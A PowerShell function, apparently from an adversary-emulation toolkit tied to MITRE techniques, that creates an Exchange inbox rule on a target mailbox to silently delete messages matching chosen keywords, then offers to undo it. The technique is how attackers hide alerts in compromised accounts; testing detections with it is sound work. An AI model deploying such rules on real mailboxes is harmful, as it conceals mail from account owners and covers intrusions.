function MailboxDeleteRuleSetup {	
    mitre_details("MailboxDeleteRuleSetup")

    EnterMailbox("Enter a mailbox address to setup mail deletion rule on")

    #Enter account to compromise
    $target_mailbox = $global:mailbox_address
    $InboxRuleName = Read-Host -Prompt "`nEnter a name for the mailbox rule you want to create"
    Write-Host "`nConfiguring mailbox rule to delete emails from $target_mailbox mailbox containing specific terms" -ForegroundColor Gray

    #Take keywords for the mailbox rule
    do {
        $input_rule_keywords = Read-Host -Prompt "`nEnter a term or multiple terms separated by comma(,) to include in the mailbox rule"

        if ($input_rule_keywords -eq $null) {
            Write-Host "`n[Input Error] Its not like giving a compliment. I am sure you can come up with a few words ;)" -ForegroundColor Red
        }
    } while (
        $input_rule_keywords -eq $null
    )
    
    $rule_keywords = $input_rule_keywords.Split(",").TrimStart()
    
    #Setup Inbox Rules
    try {
        Write-Host "`nCreating mailbox rule to delete messages with keywords matching: $rule_keywords"
        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $target_mailbox -Confirm:$false -ErrorAction Stop
        Start-Sleep -s 5

        #Confirm new rule setup
        Write-Host "`nRetrieving deployed rule info..." -ForegroundColor Gray
        Get-InboxRule $InboxRuleName -Mailbox $target_mailbox
        Write-Host "`n[Success] New mail deletion rule deployed" -ForegroundColor Yellow 
        $allow_undo = $true
    }
    catch {
        Write-Host "`n[Error] Failed to deploy mail deletion rule" -ForegroundColor Red
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $user_choice = Read-Host -Prompt "`nWould you like to remove the mailbox rule created (Yes/No)"

        if ($user_choice -notin "No","no","N","n"){
            try {
                Write-Host "`nRemoving newly created mailbox rule..." -ForegroundColor Gray
                Remove-InboxRule -Mailbox $target_mailbox -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
                Write-Host "`n[Undo Success] Removed mailbox rule: $InboxRuleName" -ForegroundColor Yellow
            }
            catch {
                Write-Host "`n[Undo Error] Failed to delete mailbox rule $InboxRuleName." -ForegroundColor Red
            }
        }
    }
    Pause
}